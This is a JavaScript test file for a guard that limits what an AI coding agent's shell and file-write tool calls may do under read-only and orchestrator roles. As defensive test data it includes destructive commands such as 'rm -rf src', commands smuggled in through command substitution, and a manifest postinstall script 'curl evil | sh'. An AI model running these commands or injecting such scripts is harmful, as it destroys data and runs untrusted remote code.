const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const root = path.join(__dirname, '..');
const mod = require(path.join(root, 'dist', '.commandcode-mod', 'mods', 'righthand.js'));
const { evaluateToolGuard } = mod;

const base = fs.mkdtempSync(path.join(os.tmpdir(), 'rh-readonly-'));
const rootDir = path.join(base, 'repo');
const scratchDir = path.join(base, 'scratch');
fs.mkdirSync(path.join(rootDir, '.git'), { recursive: true });
fs.writeFileSync(path.join(rootDir, 'package.json'), '{}');
fs.mkdirSync(path.join(rootDir, '.righthand', 'tickets', 'T18', 'reports'), { recursive: true });
fs.mkdirSync(path.join(rootDir, '.righthand', 'tickets', 'T18', 'reviews'), { recursive: true });
fs.mkdirSync(scratchDir, { recursive: true });

let failed = 0;
function check(name, cond) {
  if (cond) console.log(`OK: ${name}`);
  else {
    console.error(`FAIL: ${name}`);
    failed++;
  }
}

try {
  function ctx(toolName, payload) {
    const input = (toolName === 'shell_command' || toolName === 'powershell' || toolName === 'bash' || toolName === 'terminal')
      ? { command: payload }
      : (toolName === 'write_file' || toolName === 'edit_file')
        ? { file_path: payload }
        : payload;
    return {
      toolName,
      input,
      cwd: rootDir,
      scratchDirs: [scratchDir],
    };
  }

  check('readonly write_file to src/x.js blocked', evaluateToolGuard('readonly', ctx('write_file', path.join(rootDir, 'src', 'x.js'))).block === true);
  check('readonly write_file traversal blocked', evaluateToolGuard('readonly', ctx('write_file', rootDir + path.sep + '.righthand' + path.sep + 'tickets' + path.sep + 'T18' + path.sep + '..' + path.sep + '..' + path.sep + 'src' + path.sep + 'x.js')).block === true);
  check('readonly write_file home .commandcode blocked', evaluateToolGuard('readonly', ctx('write_file', path.join(os.homedir(), '.commandcode', 'mods', 'righthand.ts'))).block === true);
  check('readonly write_file nested .righthand blocked', evaluateToolGuard('readonly', ctx('write_file', path.join(rootDir, 'src', '.righthand', 'x.js'))).block === true);
  if (process.platform === 'win32') {
    check('readonly write_file trailing-space traversal blocked', evaluateToolGuard('readonly', ctx('write_file', rootDir + path.sep + '.righthand' + path.sep + '.. ' + path.sep + 'src' + path.sep + 'x.js')).block === true);
  }
  check('readonly shell echo redirect blocked', evaluateToolGuard('readonly', ctx('shell_command', 'echo hi > src/x.js')).block === true);
  check('readonly shell rm blocked', evaluateToolGuard('readonly', ctx('shell_command', 'rm -rf src')).block === true);
  check('readonly shell node src blocked', evaluateToolGuard('readonly', ctx('shell_command', 'node src/x.js')).block === true);
  check('readonly shell node -e blocked', evaluateToolGuard('readonly', ctx('shell_command', 'node -e "require(\'fs\').writeFileSync(\'src/x.js\',\'\')"')).block === true);
  check('readonly shell python -c blocked', evaluateToolGuard('readonly', ctx('shell_command', 'python -c "open(\'src/x.js\',\'w\')"')).block === true);
  check('readonly shell bash -c blocked', evaluateToolGuard('readonly', ctx('shell_command', 'bash -c "rm -rf src"')).block === true);
  check('readonly shell powershell -Command blocked', evaluateToolGuard('readonly', ctx('shell_command', 'powershell -Command "Set-Content src/x.js hi"')).block === true);
  check('readonly shell powershell inline blocked', evaluateToolGuard('readonly', ctx('shell_command', 'powershell "Remove-Item src"')).block === true);
  check('readonly powershell tool blocked', evaluateToolGuard('readonly', { toolName: 'powershell', input: { command: 'rm -rf src' }, cwd: rootDir, scratchDirs: [scratchDir] }).block === true);
  check('readonly shell empty input blocked', evaluateToolGuard('readonly', { toolName: 'shell_command', input: {}, cwd: rootDir, scratchDirs: [scratchDir] }).block === true);
  check('readonly shell non-string command blocked', evaluateToolGuard('readonly', { toolName: 'shell_command', input: { command: 42 }, cwd: rootDir, scratchDirs: [scratchDir] }).block === true);
  check('readonly shell git worktree blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git worktree add ../wt')).block === true);
  check('readonly shell git apply blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git apply p.diff')).block === true);
  check('readonly shell patch blocked', evaluateToolGuard('readonly', ctx('shell_command', 'patch -p1 < p.diff')).block === true);
  check('readonly shell git restore blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git restore src/x.js')).block === true);
  check('readonly shell npm install blocked', evaluateToolGuard('readonly', ctx('shell_command', 'npm install')).block === true);
  check('readonly write_file src/.righthand blocked', evaluateToolGuard('readonly', ctx('write_file', path.join(rootDir, 'src', '.righthand', 'x.js'))).block === true);
  check('readonly throwing getter blocked', (() => {
    const input = {};
    Object.defineProperty(input, 'file_path', { get() { throw new Error('boom'); } });
    try {
      return evaluateToolGuard('readonly', { toolName: 'write_file', input, cwd: rootDir, scratchDirs: [scratchDir] }).block === true;
    } catch (e) {
      return false;
    }
  })());

  check('readonly write_file to .righthand reports allowed', evaluateToolGuard('readonly', ctx('write_file', path.join(rootDir, '.righthand', 'tickets', 'T18', 'reports', 'a.md'))).block === false);
  check('readonly edit_file to .righthand reviews allowed', evaluateToolGuard('readonly', ctx('edit_file', path.join(rootDir, '.righthand', 'tickets', 'T18', 'reviews', 'r.md'))).block === false);
  check('readonly write_file scratch allowed', evaluateToolGuard('readonly', ctx('write_file', path.join(scratchDir, 'probe.js'))).block === false);
  if (process.platform === 'win32') {
    check('readonly write_file scratch case-insensitive allowed', evaluateToolGuard('readonly', { toolName: 'write_file', input: { file_path: scratchDir.toLowerCase() + path.sep + 'a.md' }, cwd: rootDir, scratchDirs: [scratchDir] }).block === false);
  }
  check('readonly shell npm test allowed', evaluateToolGuard('readonly', ctx('shell_command', 'npm test')).block === false);
  check('readonly shell node scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `node ${path.join(scratchDir, 'probe.js')}`)).block === false);
  check('readonly shell node flags then path allowed', evaluateToolGuard('readonly', ctx('shell_command', `node --enable-source-maps ${path.join(scratchDir, 'probe.js')}`)).block === false);
  check('readonly shell git log format allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git log --format=%s')).block === false);
  check('readonly shell 2>&1 allowed', evaluateToolGuard('readonly', ctx('shell_command', 'npm test 2>&1')).block === false);
  check('readonly shell >&2 allowed', evaluateToolGuard('readonly', ctx('shell_command', 'echo hi >&2')).block === false);
  check('readonly shell pm test redirect blocked', evaluateToolGuard('readonly', ctx('shell_command', 'npm test > out.log')).block === true);
  check('readonly read_file allowed', evaluateToolGuard('readonly', { toolName: 'read_file', input: { file_path: path.join(rootDir, 'src', 'x.js') }, cwd: rootDir, scratchDirs: [scratchDir] }).block === false);
  check('readonly grep allowed', evaluateToolGuard('readonly', { toolName: 'grep', input: { pattern: 'x' }, cwd: rootDir, scratchDirs: [scratchDir] }).block === false);
  check('readonly glob allowed', evaluateToolGuard('readonly', { toolName: 'glob', input: { pattern: '**/*.ts' }, cwd: rootDir, scratchDirs: [scratchDir] }).block === false);
  check('writer write_file allowed', evaluateToolGuard('writer', ctx('write_file', path.join(rootDir, 'src', 'x.js'))).block === false);
  check('null write_file allowed', evaluateToolGuard(null, ctx('write_file', path.join(rootDir, 'src', 'x.js'))).block === false);
  check('relative path resolution blocked', evaluateToolGuard('readonly', { toolName: 'write_file', input: { file_path: 'src/x.js' }, cwd: rootDir, scratchDirs: [scratchDir] }).block === true);

  // Issue #38: the guard must decide from parsed commands and target paths, not from blocked words.
  check('readonly shell node -p allowed', evaluateToolGuard('readonly', ctx('shell_command', 'node -p "1+1"')).block === false);
  check('readonly shell node --print allowed', evaluateToolGuard('readonly', ctx('shell_command', 'node --print "Date.now()"')).block === false);
  check('readonly shell semicolon git reads allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git status --porcelain; git log --oneline -2; git branch')).block === false);
  check('readonly shell git tag list allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git status; git log; git tag --list "v1.3*"')).block === false);
  check('readonly shell git tag -l allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git tag -l')).block === false);
  check('readonly shell git worktree list allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git worktree list')).block === false);
  check('readonly shell git worktree list porcelain allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git worktree list --porcelain')).block === false);
  check('readonly shell git branch list allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git branch --list "fix/*"')).block === false);
  check('readonly shell git remote -v allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git remote -v')).block === false);
  check('readonly shell git stash list allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git stash list')).block === false);
  check('readonly shell git config read allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git config user.name')).block === false);
  check('readonly shell git log path segment named rm allowed', evaluateToolGuard('readonly', ctx('shell_command', 'git log -- src/rm/mv/cp.ts')).block === false);
  check('readonly shell grep word rm allowed', evaluateToolGuard('readonly', ctx('shell_command', 'grep -rn "rm" docs')).block === false);
  check('readonly shell npm ls allowed', evaluateToolGuard('readonly', ctx('shell_command', 'npm ls --depth=0')).block === false);
  check('readonly shell gh pr view allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh pr view 38 --json title')).block === false);
  check('readonly shell Remove-Item scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `Remove-Item "${path.join(scratchDir, 'tmp.txt')}"`)).block === false);
  check('readonly shell Remove-Item recurse force scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `Remove-Item -Recurse -Force "${path.join(scratchDir, 'tmp')}"`)).block === false);
  check('readonly shell Out-File scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `Out-File "${path.join(scratchDir, 'out.txt')}"`)).block === false);
  check('readonly shell Out-File scratch forward slashes allowed', evaluateToolGuard('readonly', ctx('shell_command', `Out-File "${scratchDir.split(path.sep).join('/')}/out.txt"`)).block === false);
  check('readonly shell Set-Content scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `Set-Content -Path "${path.join(scratchDir, 'out.txt')}" -Value hi`)).block === false);
  check('readonly shell redirect scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `echo hi > "${path.join(scratchDir, 'out.txt')}"`)).block === false);
  check('readonly shell rm scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `rm -rf "${path.join(scratchDir, 'tmp')}"`)).block === false);
  check('readonly shell sed -i scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `sed -i "s/a/b/" "${path.join(scratchDir, 'x.txt')}"`)).block === false);
  check('readonly shell pwsh -File scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `pwsh -File "${path.join(scratchDir, 'x.ps1')}"`)).block === false);

  check('readonly shell git tag create blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git tag v9.9.9')).block === true);
  check('readonly shell git tag annotate blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git tag -a v9.9.9 -m x')).block === true);
  check('readonly shell git branch delete blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git branch -d feature')).block === true);
  check('readonly shell git branch create blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git branch feature')).block === true);
  check('readonly shell git stash blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git stash')).block === true);
  check('readonly shell git config write blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git config user.name Agi')).block === true);
  check('readonly shell git pull blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git pull')).block === true);
  check('readonly shell git commit blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git commit -m x')).block === true);
  check('readonly shell Remove-Item src blocked', evaluateToolGuard('readonly', ctx('shell_command', 'Remove-Item -Recurse src')).block === true);
  check('readonly shell Out-File src blocked', evaluateToolGuard('readonly', ctx('shell_command', 'Out-File src/x.txt')).block === true);
  check('readonly shell cp from scratch to src blocked', evaluateToolGuard('readonly', ctx('shell_command', `cp "${path.join(scratchDir, 'a')}" src/a`)).block === true);
  check('readonly shell sed -i outside blocked', evaluateToolGuard('readonly', ctx('shell_command', 'sed -i "s/a/b/" src/x.js')).block === true);
  check('readonly shell python -m blocked', evaluateToolGuard('readonly', ctx('shell_command', 'python -m http.server')).block === true);
  check('readonly shell npm ci blocked', evaluateToolGuard('readonly', ctx('shell_command', 'npm ci')).block === true);
  check('readonly shell gh pr merge blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh pr merge 38')).block === true);
  check('readonly shell gh api post blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh api -X POST repos/x/issues')).block === true);
  check('readonly shell chained mutation blocked', evaluateToolGuard('readonly', ctx('shell_command', 'npm test; rm -rf src')).block === true);
  check('readonly shell piped redirect outside blocked', evaluateToolGuard('readonly', ctx('shell_command', 'git log | Out-File src/log.txt')).block === true);
  check('readonly shell sudo rm blocked', evaluateToolGuard('readonly', ctx('shell_command', 'sudo rm -rf src')).block === true);
  check('readonly shell cmd /c rm blocked', evaluateToolGuard('readonly', ctx('shell_command', 'cmd /c rm -rf src')).block === true);
  check('readonly shell timeout rm blocked', evaluateToolGuard('readonly', ctx('shell_command', 'timeout 5 rm -rf src')).block === true);
  check('readonly shell env mutation blocked', evaluateToolGuard('readonly', ctx('shell_command', 'env FOO=1 rm -rf src')).block === true);
  check('readonly shell sudo git status allowed', evaluateToolGuard('readonly', ctx('shell_command', 'sudo git status')).block === false);
  check('readonly shell env npm test allowed', evaluateToolGuard('readonly', ctx('shell_command', 'env CI=1 npm test')).block === false);

  // gh content-append: filing tickets, commenting, opening a PR (issue #42)
  check('readonly shell gh issue create allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue create --title "x" --body "y"')).block === false);
  check('readonly shell gh issue create body-file allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue create --title "x" --body-file body.md')).block === false);
  check('readonly shell gh issue comment allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue comment 38 --body "x"')).block === false);
  check('readonly shell gh issue comment body-file allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue comment 38 --body-file f.md')).block === false);
  check('readonly shell gh issue edit body allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue edit 38 --body "x"')).block === false);
  check('readonly shell gh pr comment allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh pr comment 39 --body "x"')).block === false);
  check('readonly shell gh pr create allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh pr create --title x --body y --base main')).block === false);
  check('readonly shell gh issue list allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue list --state open')).block === false);
  check('readonly shell gh release view allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh release view v1.3.2')).block === false);
  check('readonly shell gh run view log allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh run view 123 --log')).block === false);
  check('readonly shell gh api get allowed', evaluateToolGuard('readonly', ctx('shell_command', 'gh api repos/x/issues/38')).block === false);

  // gh destructive verbs stay blocked (issue #42)
  check('readonly shell gh pr edit base blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh pr edit 39 --base main')).block === true);
  check('readonly shell gh gist create blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh gist create secrets.env')).block === true);
  check('readonly shell gh pr close blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh pr close 39')).block === true);
  check('readonly shell gh pr review blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh pr review 39 --approve')).block === true);
  check('readonly shell gh issue close blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue close 38')).block === true);
  check('readonly shell gh issue delete blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh issue delete 38')).block === true);
  check('readonly shell gh release create blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh release create v1.0.0')).block === true);
  check('readonly shell gh repo delete blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh repo delete x/y')).block === true);
  check('readonly shell gh secret set blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh secret set FOO')).block === true);
  check('readonly shell gh auth login blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh auth login')).block === true);
  check('readonly shell gh api delete blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh api -X DELETE repos/x')).block === true);
  check('readonly shell gh api field blocked', evaluateToolGuard('readonly', ctx('shell_command', 'gh api repos/x/issues -f title=y')).block === true);

  // paths built from variables: allowed only inside scratchpad / .righthand (issue #42)
  check('readonly shell ps var scratch Set-Content allowed', evaluateToolGuard('readonly', ctx('shell_command', `$d = "${scratchDir}"; Set-Content -Path "$d/x.txt" -Value hi`)).block === false);
  check('readonly shell ps var scratch redirect allowed', evaluateToolGuard('readonly', ctx('shell_command', `$d = "${scratchDir}"; echo hi > "$d/y.txt"`)).block === false);
  check('readonly shell ps var reports allowed', evaluateToolGuard('readonly', ctx('shell_command', `$r = "${rootDir}"; Set-Content -Path "$r/.righthand/tickets/T18/reports/x.md" -Value hi`)).block === false);
  check('readonly shell ps inline var scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `$d="${scratchDir}"; Set-Content -Path "$d/z.txt" -Value hi`)).block === false);
  check('readonly shell bash var scratch allowed', evaluateToolGuard('readonly', ctx('shell_command', `D="${scratchDir}"; echo hi > "$D/f.txt"`)).block === false);
  check('readonly shell ps var nested allowed', evaluateToolGuard('readonly', ctx('shell_command', `$base = "${rootDir}"; $rep = "$base/.righthand/tickets/T18/reports"; Set-Content -Path "$rep/n.md" -Value hi`)).block === false);
  // a variable assigned from the environment must still resolve (found by e2e)
  const prevScratch = process.env.COMMANDCODE_SCRATCHPAD;
  process.env.COMMANDCODE_SCRATCHPAD = scratchDir;
  check('readonly shell var from env allowed', evaluateToolGuard('readonly', ctx('shell_command', '$d = $env:COMMANDCODE_SCRATCHPAD; Set-Content -Path "$d/v.txt" -Value hi')).block === false);
  check('readonly shell var from env quoted allowed', evaluateToolGuard('readonly', ctx('shell_command', '$d = "$env:COMMANDCODE_SCRATCHPAD"; Set-Content -Path "$d/v.txt" -Value hi')).block === false);
  process.env.COMMANDCODE_SCRATCHPAD = path.join(scratchDir, '..', 'outside');
  check('readonly shell var from env outside blocked', evaluateToolGuard('readonly', ctx('shell_command', '$d = $env:COMMANDCODE_SCRATCHPAD; Set-Content -Path "$d/v.txt" -Value hi')).block === true);
  if (prevScratch === undefined) delete process.env.COMMANDCODE_SCRATCHPAD;
  else process.env.COMMANDCODE_SCRATCHPAD = prevScratch;

  // variable resolution must not become an escape hatch
  check('readonly shell ps var to src blocked', evaluateToolGuard('readonly', ctx('shell_command', `$d = "${rootDir}"; Set-Content -Path "$d/src.js" -Value hi`)).block === true);
  check('readonly shell ps var redirect src blocked', evaluateToolGuard('readonly', ctx('shell_command', `$d = "${rootDir}"; echo hi > "$d/src.js"`)).block === true);
  check('readonly shell bash var to src blocked', evaluateToolGuard('readonly', ctx('shell_command', `D="${rootDir}"; echo hi > "$D/src.js"`)).block === true);
  check('readonly shell unresolved var blocked', evaluateToolGuard('readonly', ctx('shell_command', 'Set-Content -Path "$unknown/x.txt" -Value hi')).block === true);
  check('readonly shell var traversal blocked', evaluateToolGuard('readonly', ctx('shell_command', `$d = "${scratchDir}"; echo hi > "$d/../../src.js"`)).block === true);
  check('readonly shell rm with var to src blocked', evaluateToolGuard('readonly', ctx('shell_command', `$d = "${rootDir}"; rm -rf "$d/src"`)).block === true);
  check('readonly shell var from env userprofile blocked', evaluateToolGuard('readonly', ctx('shell_command', 'Set-Content -Path "$env:USERPROFILE/x.txt" -Value hi')).block === true);

  // command substitution hides a second command from the tokenizer (issue #44)
  check('readonly bash substitution format blocked', evaluateToolGuard('readonly', ctx('bash', 'git log --oneline --format="$(rm -rf src)"')).block === true);
  check('readonly bash substitution arg blocked', evaluateToolGuard('readonly', ctx('bash', 'git status --short "$(touch src/x)"')).block === true);
  check('readonly bash substitution unquoted blocked', evaluateToolGuard('readonly', ctx('bash', 'git log --format=%h $(rm -rf src)')).block === true);
  check('readonly bash backtick blocked', evaluateToolGuard('readonly', ctx('bash', 'echo `rm -rf src`')).block === true);
  check('readonly bash backtick in double quotes blocked', evaluateToolGuard('readonly', ctx('bash', 'echo "`rm -rf src`"')).block === true);
  check('readonly bash nested substitution blocked', evaluateToolGuard('readonly', ctx('bash', 'node -p "$(rm -rf src)"')).block === true);
  check('readonly bash nested inner substitution blocked', evaluateToolGuard('readonly', ctx('bash', 'echo $(echo $(rm -rf src))')).block === true);
  check('readonly bash gh substitution blocked', evaluateToolGuard('readonly', ctx('bash', 'gh pr create --title "$(rm -rf src)" --body y')).block === true);
  check('readonly bash process substitution blocked', evaluateToolGuard('readonly', ctx('bash', 'git diff <(rm -rf src)')).block === true);
  check('readonly bash output process substitution blocked', evaluateToolGuard('readonly', ctx('bash', 'tee >(rm -rf src)')).block === true);
  check('readonly bash substitution writes outside blocked', evaluateToolGuard('readonly', ctx('bash', 'echo hi > "$(rm -rf src)"')).block === true);
  check('readonly bash unbalanced substitution blocked', evaluateToolGuard('readonly', ctx('bash', 'echo "$(rm -rf src"')).block === true);
  check('readonly bash substitution git commit blocked', evaluateToolGuard('readonly', ctx('bash', 'git log $(git commit -m x)')).block === true);
  check('readonly powershell substitution blocked', evaluateToolGuard('readonly', ctx('powershell', 'git log --format="$(rm -rf src)"')).block === true);
  check('readonly powershell substitution unquoted blocked', evaluateToolGuard('readonly', ctx('powershell', 'Write-Output $(rm -rf src)')).block === true);
  check('readonly powershell substitution in single quotes allowed', evaluateToolGuard('readonly', ctx('powershell', "git log --grep='$(foo)'")).block === false);

  // literals that only look like substitution must stay allowed
  check('readonly bash format percent allowed', evaluateToolGuard('readonly', ctx('bash', 'git log --format="%h %s"')).block === false);
  check('readonly bash grep parens allowed', evaluateToolGuard('readonly', ctx('bash', 'git log --grep="fix(guard)"')).block === false);
  check('readonly bash single quoted substitution allowed', evaluateToolGuard('readonly', ctx('bash', "git log --grep='$(foo)'")).block === false);
  check('readonly bash escaped substitution allowed', evaluateToolGuard('readonly', ctx('bash', 'git log --grep="\\$("')).block === false);
  check('readonly bash arithmetic allowed', evaluateToolGuard('readonly', ctx('bash', 'echo $((1+2))')).block === false);
  check('readonly bash arithmetic with nested mutation blocked', evaluateToolGuard('readonly', ctx('bash', 'echo $(( $(rm -rf src) ))')).block === true);

  // a substitution whose own command is read-only must not disturb real work
  check('readonly bash substitution rev-parse allowed', evaluateToolGuard('readonly', ctx('bash', 'git log --oneline $(git rev-parse --abbrev-ref HEAD)..HEAD')).block === false);
  check('readonly bash substitution merge-base allowed', evaluateToolGuard('readonly', ctx('bash', 'git diff $(git merge-base main HEAD)')).block === false);
  check('readonly bash substitution cat-file allowed', evaluateToolGuard('readonly', ctx('bash', 'git show $(git rev-parse HEAD):package.json')).block === false);
  check('readonly bash substitution gh view allowed', evaluateToolGuard('readonly', ctx('bash', 'gh issue comment 38 --body "$(gh issue view 38 --json title -q .title)"')).block === false);
  check('readonly bash backtick rev-parse allowed', evaluateToolGuard('readonly', ctx('bash', 'git log --oneline `git rev-parse HEAD`')).block === false);
  check('readonly powershell substitution Get-Date allowed', evaluateToolGuard('readonly', ctx('powershell', 'Write-Output "$(Get-Date)"')).block === false);
  check('readonly powershell substitution rev-parse allowed', evaluateToolGuard('readonly', ctx('powershell', 'git log --oneline $(git rev-parse --abbrev-ref HEAD)')).block === false);
  check('readonly powershell backtick escape allowed', evaluateToolGuard('readonly', ctx('powershell', 'Write-Output "line1`nline2"')).block === false);
  check('readonly powershell escaped substitution allowed', evaluateToolGuard('readonly', ctx('powershell', 'Write-Output "`$(literal)"')).block === false);

  function personaCtx(persona, command) {
    return {
      toolName: 'powershell',
      input: { command },
      cwd: rootDir,
      scratchDirs: [scratchDir],
      persona,
    };
  }
  function orchestratorBlocks(command) {
    return evaluateToolGuard('readonly', personaCtx('orchestrator', command)).block === true;
  }

  check('orchestrator git fetch allowed', orchestratorBlocks('git fetch origin --prune') === false);
  check('orchestrator git rebase origin/main allowed', orchestratorBlocks('git rebase origin/main') === false);
  check('orchestrator git push branch allowed', orchestratorBlocks('git push -u origin chore/guard-shared-module') === false);
  check('orchestrator git push force-with-lease allowed', orchestratorBlocks('git push origin HEAD --force-with-lease') === false);
  check('orchestrator gh pr create allowed', orchestratorBlocks('gh pr create --title x --body y') === false);
  check('orchestrator gh pr edit allowed', orchestratorBlocks('gh pr edit 55 --body z') === false);

  check('orchestrator git add allowed', orchestratorBlocks('git add -A') === false);
  check('orchestrator git add manifest allowed', orchestratorBlocks('git add package.json package-lock.json') === false);
  check('orchestrator git add -p blocked', orchestratorBlocks('git add -p') === true);
  check('orchestrator git commit -m allowed', orchestratorBlocks('git commit -m "chore(release): 1.3.4"') === false);
  check('orchestrator git commit -F allowed', orchestratorBlocks('git commit -F msg.txt') === false);
  check('orchestrator git commit without message blocked', orchestratorBlocks('git commit') === true);
  check('orchestrator git commit --amend blocked', orchestratorBlocks('git commit --amend -m x') === true);
  check('orchestrator git commit --no-verify blocked', orchestratorBlocks('git commit --no-verify -m x') === true);
  check('orchestrator git tag allowed', orchestratorBlocks('git tag v1.3.4') === false);
  check('orchestrator annotated tag with message allowed', orchestratorBlocks('git tag -a v1.3.4 -m "v1.3.4"') === false);
  check('orchestrator annotated tag without message blocked', orchestratorBlocks('git tag -a v1.3.4') === true);
  check('orchestrator git tag -d blocked', orchestratorBlocks('git tag -d v1.3.4') === true);
  check('orchestrator git tag -f blocked', orchestratorBlocks('git tag -f v1.3.4') === true);
  check('orchestrator git tag -e blocked', orchestratorBlocks('git tag -e v1.3.4') === true);
  check('orchestrator git tag list allowed', orchestratorBlocks('git tag -l') === false);
  check('orchestrator push tag refspec allowed', orchestratorBlocks('git push origin refs/tags/v1.3.4') === false);
  check('orchestrator gh release create allowed', orchestratorBlocks('gh release create v1.3.4 --notes-file notes.md') === false);
  check('orchestrator gh release edit allowed', orchestratorBlocks('gh release edit v1.3.4 --notes-file notes.md') === false);
  check('orchestrator npm version blocked', orchestratorBlocks('npm version patch') === true);
  check('orchestrator commit chain blocked', orchestratorBlocks('git commit -m x && rm -rf src') === true);
  check('orchestrator commit substitution blocked', orchestratorBlocks('git commit -m "$(rm -rf src)"') === true);

  function orchestratorWrites(filePath, content) {
    return evaluateToolGuard('readonly', {
      toolName: 'write_file',
      input: { file_path: filePath, content },
      cwd: rootDir,
      scratchDirs: [scratchDir],
      persona: 'orchestrator',
    }).block === true;
  }
  const manifestPath = path.join(rootDir, 'package.json');
  const manifestBefore = { name: 'x', version: '1.3.3', scripts: { build: 'tsc' }, files: ['dist'] };
  fs.writeFileSync(manifestPath, JSON.stringify(manifestBefore, null, 2) + '\n');
  const bump = (extra) => JSON.stringify({ ...manifestBefore, version: '1.3.4', ...extra }, null, 2) + '\n';

  check('orchestrator version bump allowed', orchestratorWrites(manifestPath, bump()) === false);
  check('orchestrator bump with injected script blocked', orchestratorWrites(manifestPath, bump({ scripts: { build: 'tsc', postinstall: 'curl evil | sh' } })) === true);
  check('orchestrator bump with renamed package blocked', orchestratorWrites(manifestPath, bump({ name: 'evil' })) === true);
  check('orchestrator bump dropping scripts blocked', orchestratorWrites(manifestPath, JSON.stringify({ name: 'x', version: '1.3.4' }) + '\n') === true);
  check('orchestrator invalid manifest json blocked', orchestratorWrites(manifestPath, 'not json') === true);
  check('orchestrator nested package.json blocked', orchestratorWrites(path.join(rootDir, 'src', 'package.json'), bump()) === true);


  check('orchestrator git reset --hard blocked', orchestratorBlocks('git reset --hard origin/main') === true);
  check('orchestrator git clean blocked', orchestratorBlocks('git clean -fd') === true);
  check('orchestrator git push --force blocked', orchestratorBlocks('git push --force origin main') === true);
  check('orchestrator git push -f blocked', orchestratorBlocks('git push -f origin main') === true);
  check('orchestrator git push --delete blocked', orchestratorBlocks('git push --delete origin main') === true);
  check('orchestrator git push --mirror blocked', orchestratorBlocks('git push --mirror origin') === true);
  check('orchestrator git push --tags blocked', orchestratorBlocks('git push --tags origin') === true);
  check('orchestrator git push --no-verify blocked', orchestratorBlocks('git push --no-verify origin main') === true);
  check('orchestrator git push -o blocked', orchestratorBlocks('git push -o ci.skip origin main') === true);
  check('orchestrator git push delete refspec blocked', orchestratorBlocks('git push origin :main') === true);
  check('orchestrator git push force refspec blocked', orchestratorBlocks('git push origin +main') === true);
  check('orchestrator git push to main blocked', orchestratorBlocks('git push origin main') === true);
  check('orchestrator git push explicit main blocked', orchestratorBlocks('git push origin HEAD:main') === true);
  check('orchestrator git rebase --exec blocked', orchestratorBlocks('git rebase --exec "rm -rf src" origin/main') === true);
  check('orchestrator git rebase -x blocked', orchestratorBlocks('git rebase -x "rm -rf src" origin/main') === true);
  check('orchestrator gh pr merge blocked', orchestratorBlocks('gh pr merge 55') === true);
  check('orchestrator gh pr close blocked', orchestratorBlocks('gh pr close 55') === true);
  check('orchestrator gh repo delete blocked', orchestratorBlocks('gh repo delete agirahman/righthand') === true);
  check('orchestrator shell mutation blocked', orchestratorBlocks('rm -rf src') === true);
  check('orchestrator chained mutation blocked', orchestratorBlocks('git push origin main && rm -rf src') === true);
  check('orchestrator chained destructive commit blocked', orchestratorBlocks('git push origin main; git reset --hard origin/main') === true);
  check('orchestrator chained mutation after tag blocked', orchestratorBlocks('git tag v1.3.4; rm -rf src') === true);
  check('orchestrator substitution mutation blocked', orchestratorBlocks('git push $(rm -rf src)') === true);

  check('code-reviewer git push blocked', evaluateToolGuard('readonly', personaCtx('code-reviewer', 'git push -u origin x')).block === true);
  check('code-reviewer git fetch blocked', evaluateToolGuard('readonly', personaCtx('code-reviewer', 'git fetch origin')).block === true);
  check('code-reviewer gh pr edit blocked', evaluateToolGuard('readonly', personaCtx('code-reviewer', 'gh pr edit 55 --body z')).block === true);
  check('architect git rebase blocked', evaluateToolGuard('readonly', personaCtx('architect', 'git rebase origin/main')).block === true);
  check('no persona git push blocked', evaluateToolGuard('readonly', { toolName: 'powershell', input: { command: 'git push -u origin x' }, cwd: rootDir, scratchDirs: [scratchDir] }).block === true);

  if (failed > 0) {
    console.error(`\nValidation FAILED with ${failed} errors.`);
    process.exit(1);
  }
